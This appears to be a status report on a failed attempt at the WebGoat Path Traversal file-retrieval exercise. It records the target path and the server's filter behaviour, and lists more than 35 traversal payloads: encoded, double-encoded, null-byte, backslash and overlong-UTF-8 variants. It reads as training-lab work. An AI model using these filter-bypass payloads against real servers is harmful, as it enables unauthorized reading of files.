# Path Traversal File Retrieval - Status Report

## Challenge Details
- **Lesson**: Path Traversal
- **Assignment**: ProfileUploadRetrieval
- **Objective**: Retrieve `path-traversal-secret.jpg` file
- **Endpoint**: POST `/WebGoat/PathTraversal/random`
- **Parameter**: `id`

## Key Findings

### File Location (Confirmed)
```
Target: C:\Users\mahad\.webgoat-2025.3\path-traversal-secret.jpg
Working Directory: C:\Users\mahad\.webgoat-2025.3\PathTraversal\cats\
Required Traversal: ../../ (two levels up)
```

### Server Behavior (Confirmed)
1. Server automatically appends `.jpg` to the `id` parameter value
2. Example: `id=1.jpg` becomes `1.jpg.jpg` (results in 404)
3. Example: `id=1` becomes `1.jpg` (success - returns image)

### Filter Characteristics
- Blocks `..` and `/` characters even when URL-encoded
- Returns: "Illegal characters are not allowed in the query params" (GET endpoint)
- Returns: "Sorry the solution is not correct, please try again." (POST endpoint)

## Tested Payloads (35+ variants - ALL FAILED)

### Standard URL Encoding
- `../../path-traversal-secret`
- `..%2F..%2Fpath-traversal-secret`
- `%2e%2e/%2e%2e/path-traversal-secret`
- `%2e%2e%2f%2e%2e%2fpath-traversal-secret`
- `%2E%2E%2F%2E%2E%2Fpath-traversal-secret`

### With Extensions
- `../../path-traversal-secret.jpg`
- `%2e%2e%2fpath-traversal-secret%2ejpg`

### Null Byte Injection
- `../../path-traversal-secret%00`
- `../../path-traversal-secret.jpg%00`

### Nested/Doubled Encoding
- `..././..././path-traversal-secret`
- `....//....//path-traversal-secret`
- `%252e%252e%252fpath-traversal-secret`

### Alternative Separators
- `..\..\path-traversal-secret` (Windows backslash)
- `..%5C..%5Cpath-traversal-secret` (backslash encoded)

### Unicode/UTF-8
- `%u002e%u002e/%u002e%u002e/path-traversal-secret`
- `..%c0%afpath-traversal-secret`
- `..%c0%2fpath-traversal-secret`

### Other Variations
- `.../path-traversal-secret`
- `../../path%2dtraversal%2dsecret`
- `./cats/../path-traversal-secret`
- `path-traversal-secret` (same directory)
- `..` (directory listing)

## Scripts Created
1. **path_traversal_retrieval.ps1** - Initial test framework
2. **path_traversal_auto_test.ps1** - Comprehensive automated testing

## Conclusion
After 35+ encoding variations tested systematically, this exercise appears to require:
1. A WebGoat-specific bypass technique not covered in standard path traversal
2. Manual browser testing with DevTools to inspect expected format
3. Checking the in-UI hints (6 hints available for this lesson)
4. Possibly a different attack vector (different parameter, different endpoint)

## Recommendations
1. **Skip and Continue**: Move to next WebGoat lesson and revisit later
2. **Manual Discovery**: Use browser + DevTools to discover the working payload
3. **Check Hints**: Access WebGoat UI hints for this specific exercise
4. **Community Resources**: Check WebGoat forums/solutions for this specific version

## Next Steps
Proceeding with other WebGoat challenges to maintain momentum on automation project.
